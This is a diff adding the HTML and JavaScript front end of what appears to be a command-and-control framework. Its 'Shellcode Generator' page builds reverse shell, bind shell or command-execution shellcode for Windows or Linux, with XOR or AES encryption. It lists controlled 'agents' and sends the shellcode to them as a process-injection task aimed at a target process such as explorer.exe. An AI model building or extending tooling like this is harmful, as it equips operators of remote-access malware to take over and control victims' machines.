@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shellcode Generator</title>
+    <style>
+        :root {
+            --bg: #f4f4f4;
+            --text: #333;
+            --card: #fff;
+            --border: #ddd;
+            --primary: #007BFF;
+        }
+
+        [data-theme="dark"] {
+            --bg: #121212;
+            --text: #f4f4f4;
+            --card: #1e1e1e;
+            --border: #333;
+            --primary: #0d6efd;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
+            padding: 20px;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: var(--card);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        h1 {
+            text-align: center;
+            color: var(--text);
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: var(--text);
+        }
+
+        input, select {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            background-color: var(--bg);
+            color: var(--text);
+        }
+
+        button {
+            background-color: var(--primary);
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        button:hover {
+            opacity: 0.9;
+        }
+
+        #result {
+            margin-top: 20px;
+            padding: 15px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            background-color: var(--bg);
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .toggle-theme {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: auto;
+        }
+
+        nav {
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        nav a {
+            margin: 0 15px;
+            text-decoration: none;
+            color: var(--primary);
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <button class="toggle-theme" onclick="toggleTheme()">🌙 Toggle Dark Mode</button>
+    
+    <div class="container">
+        <h1>Shellcode Generator</h1>
+        <nav>
+            <a href="/">Dashboard</a>
+            <a href="/shellcode">Shellcode Generator</a>
+            <a href="/control">Task Control Panel</a>
+        </nav>
+        
+        <div class="form-group">
+            <label for="type">Shellcode Type:</label>
+            <select id="type" onchange="updateForm()">
+                <option value="reverse">Reverse Shell</option>
+                <option value="bind">Bind Shell</option>
+                <option value="exec">Execute Command</option>
+            </select>
+        </div>
+
+        <div class="form-group" id="hostGroup">
+            <label for="host">Host:</label>
+            <input type="text" id="host" placeholder="Enter host (e.g. 192.168.1.100)">
+        </div>
+
+        <div class="form-group" id="portGroup">
+            <label for="port">Port:</label>
+            <input type="number" id="port" placeholder="Enter port (e.g. 4444)">
+        </div>
+
+        <div class="form-group" id="commandGroup" style="display: none;">
+            <label for="command">Command:</label>
+            <input type="text" id="command" placeholder="Enter command to execute">
+        </div>
+
+        <div class="form-group">
+            <label for="platform">Platform:</label>
+            <select id="platform">
+                <option value="windows">Windows</option>
+                <option value="linux">Linux</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="encoding">Encoding:</label>
+            <select id="encoding">
+                <option value="base64">Base64</option>
+                <option value="hex">Hex</option>
+                <option value="raw">Raw</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="encryption">Encryption:</label>
+            <select id="encryption" onchange="toggleKey()">
+                <option value="none">None</option>
+                <option value="xor">XOR</option>
+                <option value="aes">AES</option>
+            </select>
+        </div>
+
+        <div class="form-group" id="keyGroup" style="display: none;">
+            <label for="key">Encryption Key:</label>
+            <input type="text" id="key" placeholder="Enter encryption key">
+        </div>
+
+        <button onclick="generateShellcode()">Generate Shellcode</button>
+
+        <div id="result"></div>
+
+        <!-- Inject Shellcode to Agent UI -->
+        <div id="injectForm" style="margin-top:20px; display:none;">
+            <h3>Inject Shellcode to Agent</h3>
+            <form id="injectShellcodeForm">
+                <label for="agent_id">Agent:</label>
+                <select id="agent_id"></select>
+                <label for="process">Target Process:</label>
+                <input type="text" id="process" placeholder="e.g. explorer.exe" required>
+                <button type="submit">Send to Agent</button>
+            </form>
+            <div id="injectResult"></div>
+        </div>
+    </div>
+
+    <script>
+        function toggleTheme() {
+            const current = localStorage.getItem('theme') || 'light';
+            const next = current === 'light' ? 'dark' : 'light';
+            localStorage.setItem('theme', next);
+            document.body.setAttribute('data-theme', next);
+        }
+
+        // Initialize theme
+        document.body.setAttribute('data-theme', localStorage.getItem('theme') || 'light');
+
+        function updateForm() {
+            const type = document.getElementById('type').value;
+            const hostGroup = document.getElementById('hostGroup');
+            const portGroup = document.getElementById('portGroup');
+            const commandGroup = document.getElementById('commandGroup');
+
+            if (type === 'reverse') {
+                hostGroup.style.display = 'block';
+                portGroup.style.display = 'block';
+                commandGroup.style.display = 'none';
+            } else if (type === 'bind') {
+                hostGroup.style.display = 'none';
+                portGroup.style.display = 'block';
+                commandGroup.style.display = 'none';
+            } else if (type === 'exec') {
+                hostGroup.style.display = 'none';
+                portGroup.style.display = 'none';
+                commandGroup.style.display = 'block';
+            }
+        }
+
+        function toggleKey() {
+            const encryption = document.getElementById('encryption').value;
+            const keyGroup = document.getElementById('keyGroup');
+            keyGroup.style.display = encryption === 'none' ? 'none' : 'block';
+        }
+
+        async function generateShellcode() {
+            const type = document.getElementById('type').value;
+            const host = document.getElementById('host').value;
+            const port = document.getElementById('port').value;
+            const command = document.getElementById('command').value;
+            const platform = document.getElementById('platform').value;
+            const encoding = document.getElementById('encoding').value;
+            const encryption = document.getElementById('encryption').value;
+            const key = document.getElementById('key').value;
+
+            const data = {
+                type,
+                platform,
+                encoding,
+                encryption,
+                key
+            };
+
+            if (type === 'reverse') {
+                data.host = host;
+                data.port = parseInt(port);
+            } else if (type === 'bind') {
+                data.port = parseInt(port);
+            } else if (type === 'exec') {
+                data.command = command;
+            }
+
+            try {
+                const response = await fetch('/api/generate_shellcode', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+                
+                if (result.success) {
+                    document.getElementById('result').textContent = result.shellcode;
+                    showInjectForm();
+                } else {
+                    document.getElementById('result').textContent = `Error: ${result.error}`;
+                }
+            } catch (error) {
+                document.getElementById('result').textContent = `Error: ${error.message}`;
+            }
+        }
+
+        // Initialize form
+        updateForm();
+        toggleKey();
+
+        function showInjectForm() {
+            document.getElementById('injectForm').style.display = 'block';
+            loadAgents();
+        }
+
+        async function loadAgents() {
+            const res = await fetch('/api/agents');
+            const data = await res.json();
+            const sel = document.getElementById('agent_id');
+            sel.innerHTML = '';
+            (data.agents || data).forEach(agent => {
+                const opt = document.createElement('option');
+                opt.value = agent.agent_id || agent.id;
+                opt.textContent = agent.agent_id || agent.id;
+                sel.appendChild(opt);
+            });
+        }
+
+        document.getElementById('injectShellcodeForm').onsubmit = async function(e) {
+            e.preventDefault();
+            const agent_id = document.getElementById('agent_id').value;
+            const process = document.getElementById('process').value;
+            const shellcode = document.getElementById('result').innerText.trim();
+            const res = await fetch('/api/tasks', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    agent_id,
+                    module: 'modules.shellcode.inject',
+                    params: { process, shellcode }
+                })
+            });
+            const result = await res.json();
+            document.getElementById('injectResult').innerText = result.status === 'success' ? 'Task sent!' : ('Error: ' + (result.error || result.message));
+        };
+    </script>
+</body>
+</html>
